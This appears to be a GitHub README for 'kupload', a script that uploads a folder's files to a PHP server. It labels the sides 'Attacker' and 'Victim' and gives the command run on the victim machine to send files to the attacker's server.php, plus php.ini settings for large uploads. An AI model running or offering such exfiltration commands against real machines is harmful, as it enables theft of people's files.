# kupload
This script is used to automatically and progressively upload files to a server configured by us.

### Install

```
git clone https://github.com/JsonSecurity/kupload
cd kupload
chmod +x kupload.sh
```

### Testing

<img src="https://github.com/JsonSecurity/Images/blob/main/scripts/kupload_test.png" />

### Attacker

- First, we start the server with PHP in the folder where the `index.php`, `server.php` and `uploads/` files are located.
- We use `0.0.0.0` to indicate the local IP address and port `80`.

```
php -S 0.0.0.0:80 
```

#### Victim
- To start the file transfer or upload, we must run the `kupload.sh` script in the folder where the files we want to upload are located.
- It also has some options to indicate whether to continue from a certain file onward.
- We run it and in the first argument we provide our IP, in this case local, and the server.php file.

```
./kupload.sh http://192.168.101.30/server.php
```
#### Upload files larger than 50MB

Using PHP we search for the `php.ini` file

```
php --ini
# Loaded Configuration File: /etc/php/8.2/cli/php.ini

micro /etc/php/8.2/cli/php.ini
```

Correctly configure PHP and the server

```
; Maximum file sizes and POST
upload_max_filesize = 2G
post_max_size = 2G

; Maximum execution and reading time
max_execution_time = 300
max_input_time = 300

; Upload buffer size (important)
memory_limit = 512M
```





